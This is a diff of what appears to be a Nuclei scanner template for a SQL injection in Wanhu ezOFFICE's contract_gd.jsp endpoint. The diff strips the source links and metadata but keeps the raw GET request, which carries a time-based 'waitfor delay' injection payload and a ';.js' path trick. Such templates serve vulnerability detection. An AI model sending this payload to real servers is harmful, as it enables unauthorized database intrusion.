@@ -3,13 +3,8 @@ info:
   name: 万户 ezOFFICE contract_gd.jsp SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yxdcpx5f8qg5cma6
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yxdcpx5f8qg5cma6
 http:
 - raw:
   - 'GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27-- HTTP/1.1
@@ -28,9 +23,6 @@ http:
 
 
     Connection: keep-alive
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058892222-c99dbbfb-a5ed-414c-a540-9084f30bc118.png)
 
 
     ## 修复建议
